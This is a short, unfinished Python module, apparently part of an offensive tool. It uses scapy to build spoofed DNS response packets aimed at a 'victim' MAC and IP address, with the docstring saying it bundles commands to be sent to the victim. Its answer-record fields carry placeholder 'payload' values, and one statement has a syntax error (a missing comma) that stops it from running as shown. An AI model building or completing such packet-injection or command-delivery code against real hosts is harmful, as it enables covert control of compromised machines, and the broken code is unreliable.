"""Bundles given commands into packets to be sent to the victim. 
"""
from scapy.all import *

class Bundler():

    def __init__(self, data, victim_mac, victim_ip, victim_packet):
        self.data = data
        self.victim_mac = victim_mac
        self.victim_ip = victim_ip
        self.victim_packet = victim_packet

    def _build_packet(self):
        return self._build_ether() \
                / self._build_ip() \
                / self._build_udp() \
                / self._build_dns()

    def _build_ether(self):
        # Not sure if we need src
        return Ether(dst=self.victim_mac)

    def _build_ip(self):
        return IP(dst=self.victim_ip, ttl=128, flags='')
    
    def _build_udp(self):
        victim_udp = self.victim_packet.getlayer(UDP)
        return UDP(sport=victim_udp.dport, dport=victim_udp.sport)

    def _build_dns(self):
        victim_dns = self.victim_packet.getlayer(DNS)
        victim_qr = self.victim_packet.getlayer(DNSQR)
        return DNS(
            qr=1, rd=1, ra=1, ancount=1, nscount=0, arcount=0,
            ns=None, ar=None
            an = DNSRR(
                rrname='test', # Update with payload
                type='A',
                rclass='IN', # Update?
                ttl=700,
                rdlen=4,
                rdata='payload' # Update with payload
            )
        )